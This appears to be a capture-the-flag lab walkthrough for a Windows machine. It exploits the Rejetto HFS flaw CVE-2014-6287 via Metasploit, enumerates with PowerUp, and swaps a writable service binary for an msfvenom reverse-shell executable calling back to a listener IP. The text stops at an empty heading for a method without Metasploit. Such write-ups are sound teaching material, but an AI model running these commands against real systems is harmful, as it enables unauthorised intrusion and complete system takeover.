Who is employee of the month?

There is a web server running on the machine displays the employee of the month picture.

We don't have name.  Let's check the soruce page

The image name is Bill Harper.

There are two http server

The other one is running Rejetto Http File Server which is vulnerable CVE-2014-6287

There is a metasploit module available for this vulnerability

msf5 exploit(windows/http/rejetto_hfs_exec) > 

set the rhosts and rport as 8080

Run the exploit

User flag found!!!

Need to escalate the privilge to root


To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script here. Now you can use the upload command in Metasploit to upload the script.

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:

``` meterpreter command
upload /opt/PowerUp.ps1

load powershell

powershell_shell
```

```powershell command
. .\PowerUp.ps1

Invoke-AllChecks

```

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

AdvancedSystemCareService9


The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.11.103 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.


Root flag found in Administrator Desktop


Privilege Escalation without Metasploit


